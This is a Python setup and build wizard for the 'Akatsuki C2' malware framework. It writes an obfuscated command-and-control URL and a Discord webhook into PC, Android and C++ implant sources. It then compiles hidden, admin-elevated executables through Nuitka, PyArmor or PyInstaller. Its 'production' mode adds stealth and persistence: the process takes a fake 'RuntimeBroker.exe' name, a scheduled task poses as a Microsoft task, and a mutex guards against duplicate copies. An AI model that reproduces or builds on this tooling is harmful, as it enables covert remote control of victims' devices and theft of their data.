"""
Akatsuki C2 — Setup & Build Wizard
Run: python Akatsuki.py
      python Akatsuki.py --re        (re-configure)
      python Akatsuki.py --new       (reset all files to factory defaults)
      python Akatsuki.py --load X    (load config JSON)
"""
import sys
import os
import re
import json
import shutil
import subprocess

# Force UTF-8 for console output on Windows
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

# ─── Paths ────────────────────────────────────────────────────
ROOT        = os.path.dirname(os.path.abspath(__file__))
OBF_PY      = os.path.join(ROOT, "obfuscator.py")
PY_DIR      = os.path.join(ROOT, "Python")
CPP_DIR     = os.path.join(ROOT, "CPP")
APK_DIR     = os.path.join(ROOT, "APK")
BUILD_DIR   = os.path.join(ROOT, "build")

PAYLOAD_PC  = os.path.join(PY_DIR, "payloads-pc.py")
PAYLOAD_PH  = os.path.join(PY_DIR, "payloads-ph.py")
C2_PY       = os.path.join(PY_DIR, "c2.py")
APK_SVC     = os.path.join(APK_DIR, "service.py")
CPP_CFG     = os.path.join(CPP_DIR, "config.h")
CPP_OBF     = os.path.join(CPP_DIR, "obf_decode.h")
CPP_BUILD   = os.path.join(CPP_DIR, "build.bat")

CFG_FILE    = os.path.join(ROOT, ".akatsuki.json")

# ─── Colors (simple ANSI) ────────────────────────────────────
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"
M = "\033[95m"; W = "\033[97m"; D = "\033[90m"; BOLD = "\033[1m"
RST = "\033[0m"

def banner():
    print(f"""
{R}{BOLD}═══════════════════════════════════════════════════{RST}
{R}       赤  {W}AKATSUKI C2 — SETUP WIZARD{R}  赤{RST}
{R}{BOLD}═══════════════════════════════════════════════════{RST}
""")

def h(label):
    """Section header"""
    print(f"\n{R}══════ {W}{BOLD}{label}{RST} {R}══════{RST}")

def ok(msg):   print(f"  {G}[✓]{RST} {msg}")
def info(msg): print(f"  {C}[*]{RST} {msg}")
def warn(msg): print(f"  {Y}[!]{RST} {msg}")
def err(msg):  print(f"  {R}[✗]{RST} {msg}")

class GoBack(Exception):
    """Raised when user types --re to go back."""
    pass

def _check_re(val):
    if val.strip().lower() == "--re":
        raise GoBack()
    return val

def ask(prompt, default="", required=True):
    """Prompt with optional default value. Type --re to go back."""
    dflt = f" {D}(default: {default}){RST}" if default else ""
    hint = f" {D}(optional){RST}" if not required else ""
    while True:
        val = input(f"  {Y}>{RST} {prompt}{dflt}{hint}: ").strip()
        if val.lower() == "--re":
            raise GoBack()
        if not val and default:
            return default
        if not val and not required:
            return ""
        if val:
            return val
        print(f"  {R}  This field is required.{RST}")

def ask_yn(prompt, default=True):
    """Yes/No prompt. Type --re to go back."""
    dflt = "Y/n" if default else "y/N"
    val = input(f"  {Y}>{RST} {prompt} [{dflt}]: ").strip().lower()
    if val == "--re":
        raise GoBack()
    if not val:
        return default
    return val in ("y", "yes")

def ask_choice(prompt, choices, default=None):
    """Multiple choice prompt. Type --re to go back."""
    for i, (key, desc) in enumerate(choices, 1):
        marker = f" {G}(default){RST}" if key == default else ""
        print(f"    {C}[{i}]{RST} {desc}{marker}")
    while True:
        val = input(f"  {Y}>{RST} {prompt}: ").strip()
        if val.lower() == "--re":
            raise GoBack()
        if not val and default:
            return default
        if val.isdigit() and 1 <= int(val) <= len(choices):
            return choices[int(val)-1][0]
        for key, _ in choices:
            if val.lower() == key.lower():
                return key
        print(f"  {R}  Invalid choice. Enter 1-{len(choices)} or a key name.{RST}")

# ─── Obfuscator Integration ──────────────────────────────────
sys.path.insert(0, ROOT)
from obfuscator import obfuscate, deobfuscate

def obf_string(text, secret, rounds=4):
    """Obfuscate a string and return (byte_list, verified_text)."""
    enc = obfuscate(text, secret, rounds)
    dec = deobfuscate(enc, secret, rounds)
    return enc, dec

def bytes_to_python(data):
    """Format byte list as Python bytes([...]) literal."""
    hex_vals = ",".join(f"0x{b:02x}" for b in data)
    return f"bytes([{hex_vals}])"

def bytes_to_cpp(data):
    """Format byte list as C++ vector initializer."""
    hex_vals = ", ".join(f"0x{b:02X}" for b in data)
    return f"{{ {hex_vals} }}"

# ─── Source File Injection ────────────────────────────────────
def inject_line(filepath, pattern, replacement):
    """Replace a line matching regex pattern in a file."""
    if not os.path.exists(filepath):
        return False
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    new_content, count = re.subn(pattern, replacement, content, count=1)
    if count == 0:
        return False
    with open(filepath, "w", encoding="utf-8", errors="ignore") as f:
        f.write(new_content)
    return True

def inject_all_lines(filepath, replacements):
    """Apply multiple (pattern, replacement) pairs to a file."""
    if not os.path.exists(filepath):
        return 0
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    total = 0
    for pattern, replacement in replacements:
        content, count = re.subn(pattern, replacement, content, count=1)
        total += count
    with open(filepath, "w", encoding="utf-8", errors="ignore") as f:
        f.write(content)
    return total

# ─── Config Save / Load ──────────────────────────────────────
def save_config(cfg, path=None):
    path = path or CFG_FILE
    with open(path, "w") as f:
        json.dump(cfg, f, indent=2)
    ok(f"Config saved to {os.path.basename(path)}")

def load_config(path=None):
    path = path or CFG_FILE
    if os.path.exists(path):
        with open(path, "r") as f:
            return json.load(f)
    return None

# ─── Step 1: Gather Input (step-based, --re goes back) ───────
def gather_input(existing=None):
    cfg = existing or {}
    
    # Define all steps as functions
    def step_platform():
        h("SELECT PLATFORM")
        cfg["platform"] = ask_choice(
            "Choose target",
            [
                ("py",  f"Python PC          {D}(payloads-pc.py){RST}"),
                ("apk", f"Android / Termux   {D}(payloads-ph.py + APK/service.py){RST}"),
                ("cpp", f"C++ Native         {D}(CPP/config.h){RST}"),
                ("all", "All platforms")
            ],
            default=cfg.get("platform", "all")
        )

    def step_c2():
        h("C2 SERVER")
        cfg["c2_url"] = ask("C2 Server URL",
                            default=cfg.get("c2_url", ""))

    def step_webhook():
        h("DISCORD WEBHOOK")
        cfg["webhook"] = ask("Discord Webhook URL",
                             default=cfg.get("webhook", ""))

    def step_encryption():
        h("ENCRYPTION")
        cfg["secret_key"] = ask("Encryption key", default=cfg.get("secret_key", "k3ycu5t0m"))
        cfg["rounds"] = int(ask("Feistel rounds (1-16)", default=str(cfg.get("rounds", 4))))
        cfg["rounds"] = max(1, min(16, cfg["rounds"]))

    def step_port():
        h("C2 SERVER SETTINGS")
        cfg["c2_port"] = int(ask("C2 listening port", default=str(cfg.get("c2_port", 8080))))

    def step_mode():
        h("OPERATIONAL MODE")
        cfg["test_mode"] = ask_choice(
            "Select mode",
            [("test", "TEST  — Console visible, safe for dev"),
             ("production", "PRODUCTION — Hidden, persistent")],
            default=cfg.get("test_mode", "test")
        )

    def step_opsec():
        if cfg.get("test_mode") == "test":
            cfg["mutex_name"] = cfg.get("mutex_name", "Global\\FSOCIETY_MUTEX_0X99")
            cfg["fake_exe"] = cfg.get("fake_exe", "RuntimeBroker.exe")
            cfg["task_name"] = cfg.get("task_name", "Microsoft\\Windows\\Wininet\\CacheTask")
            cfg["heartbeat"] = cfg.get("heartbeat", 5)
            return

        h("OPSEC SETTINGS (Production)")
        cfg["mutex_name"] = ask("Mutex name (anti-duplicate)",
                               default=cfg.get("mutex_name", "Global\\FSOCIETY_MUTEX_0X99"))
        cfg["fake_exe"] = ask("Fake process name",
                             default=cfg.get("fake_exe", "RuntimeBroker.exe"))
        cfg["task_name"] = ask("Scheduled task name (persistence)",
                              default=cfg.get("task_name", "Microsoft\\Windows\\Wininet\\CacheTask"))
        cfg["heartbeat"] = int(ask("Heartbeat interval (seconds)",
                                  default=str(cfg.get("heartbeat", 5))))

    steps = [step_platform, step_c2, step_webhook, step_encryption, step_port, step_mode, step_opsec]
    
    print(f"\n  {D}Tip: type {M}--re{D} at any prompt to go back to previous step{RST}")
    
    i = 0
    while i < len(steps):
        try:
            steps[i]()
            i += 1
        except GoBack:
            if i > 0:
                i -= 1
                info("Going back...")
            else:
                warn("Already at the first step.")
    
    return cfg

# ─── Step 2: Review ──────────────────────────────────────────
def review(cfg):
    h("REVIEW CONFIGURATION")
    items = [
        ("Platform",     cfg["platform"].upper()),
        ("C2 URL",       cfg["c2_url"]),
        ("Webhook",      cfg["webhook"][:50] + "..." if len(cfg.get("webhook","")) > 50 else cfg.get("webhook","")),
        ("Secret Key",   cfg["secret_key"]),
        ("Rounds",       str(cfg["rounds"])),
        ("C2 Port",      str(cfg["c2_port"])),
        ("Mode",         cfg["test_mode"].upper()),
    ]
    if cfg.get("test_mode") != "test":
        items.extend([
            ("Mutex",        cfg["mutex_name"]),
            ("Fake EXE",     cfg["fake_exe"]),
            ("Task Name",    cfg["task_name"]),
            ("Heartbeat",    f"{cfg['heartbeat']}s"),
        ])
    for label, val in items:
        print(f"  {D}{label:14s}{RST} {W}{val}{RST}")
    print()

# ─── Step 3: Obfuscate & Inject ──────────────────────────────
def configure(cfg):
    h("CONFIGURING")
    secret = cfg["secret_key"]
    rounds = cfg["rounds"]
    platform = cfg["platform"]
    is_test = cfg["test_mode"] == "test"

    # ── Obfuscate strings ──
    c2_enc, c2_verify = obf_string(cfg["c2_url"], secret, rounds)
    if c2_verify != cfg["c2_url"]:
        err(f"C2 URL verification FAILED: got '{c2_verify}'")
        return False
    ok(f"Obfuscated C2 URL → {len(c2_enc)} bytes (verified ✓)")

    wh_enc, wh_verify = obf_string(cfg["webhook"], secret, rounds)
    if wh_verify != cfg["webhook"]:
        err(f"Webhook verification FAILED: got '{wh_verify}'")
        return False
    ok(f"Obfuscated Webhook → {len(wh_enc)} bytes (verified ✓)")

    c2_py_bytes = bytes_to_python(c2_enc)
    wh_py_bytes = bytes_to_python(wh_enc)
    c2_cpp_bytes = bytes_to_cpp(c2_enc)

    # For C++ we also need the host part (without https://)
    c2_host = cfg["c2_url"].replace("https://", "").replace("http://", "").rstrip("/")
    host_enc, host_verify = obf_string(c2_host, secret, rounds)
    c2_host_cpp = bytes_to_cpp(host_enc)

    # ── Common replacements for Python payload decoders ──
    key_pattern = r'(def _xd\(d,\s*s=")[^"]*(")'
    key_replacement = rf'\g<1>{secret}\g<2>'

    # Pre-escape backslashes for regex replacement (avoids re.error and Python 3.10 f-string backslash issues)
    safe_mutex = cfg["mutex_name"].replace("\\", "\\\\")
    safe_exe = cfg["fake_exe"].replace("\\", "\\\\")
    safe_task = cfg["task_name"].replace("\\", "\\\\")

    # ── Inject: payloads-pc.py ──
    if platform in ("py", "all"):
        count = inject_all_lines(PAYLOAD_PC, [
            (r'_C2_ENC\s*=\s*bytes\(\[.*?\]\)', f'_C2_ENC = {c2_py_bytes}'),
            (key_pattern, key_replacement),
            (r'TEST_MODE\s*=\s*(True|False)', f'TEST_MODE = {is_test}'),
            (r'(mutex_name\s*=\s*")[^"]*(")', rf'\g<1>{safe_mutex}\g<2>'),
            (r'(HEARTBEAT_INTERVAL\s*=\s*)\d+', rf'\g<1>{cfg["heartbeat"]}'),
        ])
        ok(f"payloads-pc.py — {count} replacements") if count else warn("payloads-pc.py — no changes (file missing or patterns not found)")

    # ── Inject: payloads-ph.py ──
    if platform in ("py", "apk", "all"):
        count = inject_all_lines(PAYLOAD_PH, [
            (r'_C2_ENC\s*=\s*bytes\(\[.*?\]\)', f'_C2_ENC = {c2_py_bytes}'),
            (key_pattern, key_replacement),
            (r'(HEARTBEAT_INTERVAL\s*=\s*)\d+', rf'\g<1>{cfg["heartbeat"]}'),
        ])
        ok(f"payloads-ph.py — {count} replacements") if count else warn("payloads-ph.py — no changes")

    # ── Inject: c2.py (webhook only — C2 server) ──
    if platform in ("py", "all"):
        count = inject_all_lines(C2_PY, [
            (r'_WH_ENC\s*=\s*bytes\(\[.*?\]\)', f'_WH_ENC = {wh_py_bytes}'),
            (r'(def _xd\(d,\s*s=")[^"]*(")', rf'\g<1>{secret}\g<2>'),
            (r'(port=)\d+', rf'\g<1>{cfg["c2_port"]}'),
        ])
        ok(f"c2.py — {count} replacements") if count else warn("c2.py — no changes")

    # ── Inject: APK/service.py ──
    if platform in ("apk", "all"):
        count = inject_all_lines(APK_SVC, [
            (r'_C2_ENC\s*=\s*bytes\(\[.*?\]\)', f'_C2_ENC = {c2_py_bytes}'),
            (key_pattern, key_replacement),
            (r'(HEARTBEAT_INTERVAL\s*=\s*)\d+', rf'\g<1>{cfg["heartbeat"]}'),
        ])
        ok(f"APK/service.py — {count} replacements") if count else warn("APK/service.py — no changes")

    # ── Inject: CPP/config.h ──
    if platform in ("cpp", "all"):
        count = inject_all_lines(CPP_CFG, [
            (r'(_C2_HOST_ENC\s*=\s*)\{[^}]*\}', rf'\g<1>{c2_host_cpp}'),
            (r'(_C2_URL_ENC\s*=\s*)\{[^}]*\}', rf'\g<1>{c2_cpp_bytes}'),
            (r'(#define TEST_MODE\s+)(true|false)', rf'\g<1>{"true" if is_test else "false"}'),
            (r'(#define FAKE_EXE_NAME\s+")[^"]*(")', rf'\g<1>{safe_exe}\g<2>'),
            (r'(#define TASK_NAME\s+")[^"]*(")', rf'\g<1>{safe_task}\g<2>'),
            (r'(#define HEARTBEAT_MS\s+)\d+', rf'\g<1>{cfg["heartbeat"] * 1000}'),
        ])
        ok(f"CPP/config.h — {count} replacements") if count else warn("CPP/config.h — no changes")

        # Update key in obf_decode.h
        count2 = inject_all_lines(CPP_OBF, [
            (r'(const std::string&\s+secret\s*=\s*")[^"]*(")', rf'\g<1>{secret}\g<2>'),
        ])
        ok(f"CPP/obf_decode.h — {count2} key replacements") if count2 else warn("CPP/obf_decode.h — no key changes")

    return True

# ─── Step 4: Build ────────────────────────────────────────────
def build_phase(cfg):
    h("BUILD OPTIONS")
    platform = cfg["platform"]
    os.makedirs(BUILD_DIR, exist_ok=True)

    # ── Python .exe ──
    if platform in ("py", "all"):
        if ask_yn("Build Python payload as .exe?", default=False):
            target = PAYLOAD_PC
            build_name = "payloads-pc"

            # Single choice — prevent incompatible combos
            info("Build method:")
            info("  [1] Nuitka          — native C binary, strongest protection (recommended)")
            info("  [2] PyArmor + PyInstaller — obfuscated bytecode .exe")
            info("  [3] PyInstaller only      — basic .exe packaging")
            build_method = input("  > Choose [1/2/3]: ").strip()
            if build_method not in ("1", "2", "3"):
                build_method = "1"  # default to Nuitka

            if build_method == "2":
                # PyArmor → PyInstaller
                info("Running PyArmor obfuscation...")
                r = subprocess.run(
                    [sys.executable, "-m", "pyarmor.cli", "gen", "-O", os.path.join(BUILD_DIR, "pyarmor_out"), target],
                    cwd=PY_DIR, capture_output=True, text=True
                )
                if r.returncode == 0:
                    ok("PyArmor obfuscation complete")
                    target = os.path.join(BUILD_DIR, "pyarmor_out", "payloads-pc.py")
                else:
                    err(f"PyArmor failed: {r.stderr[:200]}")
                    warn("Continuing without PyArmor")

                info("Running PyInstaller...")
                r = subprocess.run(
                    [sys.executable, "-m", "PyInstaller",
                     "--onefile", "--noconsole",
                     "--distpath", BUILD_DIR,
                     "--workpath", os.path.join(BUILD_DIR, "work"),
                     "--specpath", os.path.join(BUILD_DIR, "spec"),
                     "--name", build_name,
                     target],
                    capture_output=True, text=True
                )
                if r.returncode == 0:
                    ok(f"PyInstaller build complete")
                    info(f"Output: {os.path.join(BUILD_DIR, build_name + '.exe')}")
                else:
                    err(f"PyInstaller failed: {r.stderr[:300]}")

            elif build_method == "1":
                # Nuitka only (NO PyArmor — they are incompatible)
                info("Running Nuitka compilation...")
                nuitka_cmd = [
                    sys.executable, "-m", "nuitka",
                    "--standalone", "--onefile",
                    "--windows-console-mode=disable",
                    "--windows-uac-admin",
                    "--jobs=2",
                    "--nofollow-import-to=numpy,cv2,scipy,matplotlib,sounddevice,PIL,PyQt5,PySide6,shiboken6,tkinter",
                    "--include-data-files=" + os.path.join(os.path.dirname(__import__('certifi').__file__), "cacert.pem") + "=certifi/cacert.pem",
                    "--output-dir=" + BUILD_DIR,
                    "--output-filename=" + build_name + ".exe",
                    target
                ]

                import time as _time, threading as _th

                proc = subprocess.Popen(
                    nuitka_cmd,
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1, encoding='utf-8', errors='replace'
                )

                # Shared state between threads
                _lock = _th.Lock()
                _state = {"pct": 0, "stage": "Initializing...", "done": False}
                _SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"

                def _reader():
                    """Background thread: read Nuitka output, update progress."""
                    for raw_line in proc.stdout:
                        ln = raw_line.strip()
                        if not ln:
                            continue
                        with _lock:
                            if "Starting Python compilation" in ln:
                                _state["stage"] = "Python compilation..."
                                _state["pct"] = max(_state["pct"], 5)
                            elif "Completed Python level" in ln:
                                _state["stage"] = "Python optimization done"
                                _state["pct"] = max(_state["pct"], 15)
                            elif "Generating source code" in ln:
                                _state["stage"] = "Generating C source..."
                                _state["pct"] = max(_state["pct"], 20)
                            elif "Running data composer" in ln:
                                _state["stage"] = "Data composer..."
                                _state["pct"] = max(_state["pct"], 25)
                            elif "Running C compilation" in ln:
                                _state["stage"] = "C compilation..."
                                _state["pct"] = max(_state["pct"], 28)
                            elif "Backend C compiler" in ln:
                                cc = ln.split(":")[-1].strip().rstrip(".")
                                _state["stage"] = f"Compiler: {cc}"
                                _state["pct"] = max(_state["pct"], 30)
                            elif "Compiled " in ln and "/" in ln:
                                m = re.search(r'(\d+)/(\d+)', ln)
                                if m:
                                    done, total = int(m.group(1)), int(m.group(2))
                                    p = 30 + int(45 * done / max(total, 1))
                                    _state["pct"] = max(_state["pct"], p)
                                    _state["stage"] = f"Compiling C: {done}/{total}"
                            elif "linking" in ln.lower():
                                _state["stage"] = "Linking..."
                                _state["pct"] = max(_state["pct"], 78)
                            elif "Onefile" in ln or "onefile" in ln or "Creating single" in ln:
                                _state["stage"] = "Packing onefile..."
                                _state["pct"] = max(_state["pct"], 85)
                            elif "Keeping dist" in ln or "Removing dist" in ln:
                                _state["pct"] = max(_state["pct"], 95)
                    with _lock:
                        _state["done"] = True

                reader = _th.Thread(target=_reader, daemon=True)
                reader.start()

                # Main thread: smooth 10 FPS animation
                BAR_W = 40
                start_t = _time.time()
                spin_i = 0
                display_pct = 0.0  # float for smooth interpolation

                while True:
                    with _lock:
                        target_pct = _state["pct"]
                        stage = _state["stage"]
                        done = _state["done"]

                    # Smooth interpolation toward target
                    if display_pct < target_pct:
                        display_pct = min(display_pct + 0.8, target_pct)
                    
                    ipct = int(display_pct)
                    filled = int(BAR_W * display_pct / 100)
                    bar = f"{G}{'█' * filled}{D}{'░' * (BAR_W - filled)}{RST}"
                    elapsed = _time.time() - start_t
                    mins, secs = int(elapsed) // 60, int(elapsed) % 60
                    spin = _SPIN[spin_i % len(_SPIN)]
                    spin_i += 1

                    line = f"\r  {C}{spin}{RST} [{bar}] {W}{ipct:3d}%{RST}  {D}{stage:<35s} {mins:02d}:{secs:02d}{RST}"
                    print(line, end="", flush=True)

                    if done and proc.poll() is not None:
                        break
                    _time.sleep(0.1)

                proc.wait()

                # Final render
                elapsed = _time.time() - start_t
                mins, secs = int(elapsed) // 60, int(elapsed) % 60

                if proc.returncode == 0:
                    bar_full = f"{G}{'█' * BAR_W}{RST}"
                    print(f"\r  {G}✓{RST} [{bar_full}] {G}100%{RST}  {G}{'Build complete!':<35s} {mins:02d}:{secs:02d}{RST}")
                    exe_path = os.path.join(BUILD_DIR, build_name + ".exe")
                    ok(f"Nuitka build complete")
                    info(f"Output: {exe_path}")
                    if os.path.exists(exe_path):
                        sz = os.path.getsize(exe_path)
                        if sz > 1024*1024:
                            info(f"Size: {sz / (1024*1024):.1f} MB")
                        else:
                            info(f"Size: {sz / 1024:.0f} KB")
                else:
                    err(f"Nuitka failed (exit code {proc.returncode})")

            else:
                # PyInstaller only
                info("Running PyInstaller...")
                r = subprocess.run(
                    [sys.executable, "-m", "PyInstaller",
                     "--onefile", "--noconsole",
                     "--distpath", BUILD_DIR,
                     "--workpath", os.path.join(BUILD_DIR, "work"),
                     "--specpath", os.path.join(BUILD_DIR, "spec"),
                     "--name", build_name,
                     target],
                    capture_output=True, text=True
                )
                if r.returncode == 0:
                    ok(f"PyInstaller build complete")
                    info(f"Output: {os.path.join(BUILD_DIR, build_name + '.exe')}")
                else:
                    err(f"PyInstaller failed: {r.stderr[:300]}")

    # ── C++ Build ──
    if platform in ("cpp", "all"):
        if ask_yn("Build C++ implant?", default=False):
            mode = ask_choice(
                "Build mode",
                [("test", "TEST (console visible)"), ("release", "RELEASE (hidden, production)")],
                default="test"
            )
            info(f"Running C++ build ({mode})...")
            bat_args = ["cmd.exe", "/c", "build.bat"]
            if mode == "release":
                bat_args.append("release")
            r = subprocess.run(bat_args, cwd=CPP_DIR, capture_output=True, text=True)
            print(r.stdout)
            if r.returncode == 0:
                exe_name = "RuntimeBroker.exe" if mode == "release" else "test.exe"
                src = os.path.join(CPP_DIR, exe_name)
                dst = os.path.join(BUILD_DIR, exe_name)
                if os.path.exists(src):
                    shutil.copy2(src, dst)
                    ok(f"C++ build complete → {dst}")
            else:
                err(f"C++ build failed: {r.stderr[:300]}")

    # ── APK ──
    if platform in ("apk", "all"):
        h("APK BUILD")
        info("APK must be built in a Linux environment with buildozer.")
        info("Run the following command in the APK/ directory:")
        print(f"\n  {G}cd APK && buildozer android debug{RST}\n")
        info("Or via WSL:")
        print(f"\n  {G}wsl -e bash -c 'cd APK && buildozer android debug'{RST}\n")

# ─── Factory Reset ────────────────────────────────────────────
def reset_to_defaults():
    """Reset ALL source files back to original placeholder state."""
    h("FACTORY RESET")
    warn("This will reset all source files to their original state.")
    warn("All obfuscated URLs, webhooks, and configs will be wiped.")
    if not ask_yn("Are you sure?", default=False):
        info("Reset cancelled.")
        return False

    # Default placeholder values
    default_bytes_py = "bytes([0x00])"
    default_key = "k3ycu5t0m"
    default_port = "8080"

    # Reset payloads-pc.py
    count = inject_all_lines(PAYLOAD_PC, [
        (r'_C2_ENC\s*=\s*bytes\(\[.*?\]\)', f'_C2_ENC = {default_bytes_py} # PASTE_YOUR_BYTES_HERE'),
        (r'(def _xd\(d,\s*s=")[^"]*(")' , rf'\g<1>{default_key}\g<2>'),
        (r'TEST_MODE\s*=\s*(True|False)', 'TEST_MODE = True'),
        (r'(HEARTBEAT_INTERVAL\s*=\s*)\d+', r'\g<1>5'),
    ])
    ok(f"payloads-pc.py — reset ({count} changes)") if count else info("payloads-pc.py — already clean")

    # Reset payloads-ph.py
    count = inject_all_lines(PAYLOAD_PH, [
        (r'_C2_ENC\s*=\s*bytes\(\[.*?\]\)', f'_C2_ENC = {default_bytes_py} # PASTE_YOUR_BYTES_HERE'),
        (r'(def _xd\(d,\s*s=")[^"]*(")' , rf'\g<1>{default_key}\g<2>'),
        (r'(HEARTBEAT_INTERVAL\s*=\s*)\d+', r'\g<1>5'),
    ])
    ok(f"payloads-ph.py — reset ({count} changes)") if count else info("payloads-ph.py — already clean")

    # Reset c2.py
    count = inject_all_lines(C2_PY, [
        (r'_WH_ENC\s*=\s*bytes\(\[.*?\]\)', f'_WH_ENC = {default_bytes_py} # PASTE_YOUR_BYTES_HERE'),
        (r'(def _xd\(d,\s*s=")[^"]*(")' , rf'\g<1>{default_key}\g<2>'),
        (r'(port=)\d+', rf'\g<1>{default_port}'),
    ])
    ok(f"c2.py — reset ({count} changes)") if count else info("c2.py — already clean")

    # Reset APK/service.py
    count = inject_all_lines(APK_SVC, [
        (r'_C2_ENC\s*=\s*bytes\(\[.*?\]\)', f'_C2_ENC = {default_bytes_py} # PASTE_YOUR_BYTES_HERE'),
        (r'(def _xd\(d,\s*s=")[^"]*(")' , rf'\g<1>{default_key}\g<2>'),
        (r'(HEARTBEAT_INTERVAL\s*=\s*)\d+', r'\g<1>5'),
    ])
    ok(f"APK/service.py — reset ({count} changes)") if count else info("APK/service.py — already clean or missing")

    # Reset CPP/config.h
    count = inject_all_lines(CPP_CFG, [
        (r'(_C2_HOST_ENC\s*=\s*)\{[^}]*\}', r'\g<1>{ 0x00 }'),
        (r'(_C2_URL_ENC\s*=\s*)\{[^}]*\}', r'\g<1>{ 0x00 }'),
        (r'(#define TEST_MODE\s+)(true|false)', r'\g<1>true'),
    ])
    ok(f"CPP/config.h — reset ({count} changes)") if count else info("CPP/config.h — already clean or missing")

    # Reset CPP/obf_decode.h
    count = inject_all_lines(CPP_OBF, [
        (r'(const std::string&\s+secret\s*=\s*")[^"]*(")' , rf'\g<1>{default_key}\g<2>'),
    ])
    ok(f"CPP/obf_decode.h — reset ({count} changes)") if count else info("CPP/obf_decode.h — already clean or missing")

    # Delete config file
    if os.path.exists(CFG_FILE):
        os.remove(CFG_FILE)
        ok("Deleted .akatsuki.json")

    # Clean build directory
    if os.path.exists(BUILD_DIR):
        shutil.rmtree(BUILD_DIR, ignore_errors=True)
        ok("Cleaned build/ directory")

    ok("Factory reset complete! All files restored to defaults.")
    return True

# ─── Main ─────────────────────────────────────────────────────
def main():
    banner()

    # Handle CLI args
    args = sys.argv[1:]
    existing_cfg = None

    # --new: Factory reset
    if "--new" in args:
        reset_to_defaults()
        info("Run 'python Akatsuki.py' to start fresh configuration.")
        return

    if "--load" in args:
        idx = args.index("--load")
        if idx + 1 < len(args):
            path = args[idx + 1]
            existing_cfg = load_config(path)
            if existing_cfg:
                ok(f"Loaded config from {path}")
            else:
                err(f"Config file not found: {path}")
                return
    elif "--re" in args or os.path.exists(CFG_FILE):
        existing_cfg = load_config()
        if existing_cfg and "--re" not in args:
            info(f"Found existing config (.akatsuki.json)")
            if ask_yn("Use existing configuration?"):
                pass  # Use existing
            else:
                existing_cfg = None  # Start fresh

    # Step 1: Gather
    cfg = gather_input(existing_cfg)

    # Step 2: Review loop
    while True:
        review(cfg)
        choice = input(f"  {Y}>{RST} Confirm? [{G}Y{RST}/{R}n{RST}/{M}--re to edit{RST}]: ").strip().lower()
        if choice in ("", "y", "yes"):
            break
        elif choice == "--re":
            cfg = gather_input(cfg)
        else:
            err("Aborted.")
            return

    # Save config
    save_config(cfg)

    # Step 3: Obfuscate & Inject
    if not configure(cfg):
        err("Configuration failed. Check errors above.")
        return

    # Step 4: Build
    if ask_yn("\nProceed to build phase?", default=False):
        build_phase(cfg)

    h("DONE")
    ok("All configurations applied successfully.")
    info(f"Config saved to: {CFG_FILE}")
    info("You can re-run with: python Akatsuki.py --re")
    print()

if __name__ == "__main__":
    main()
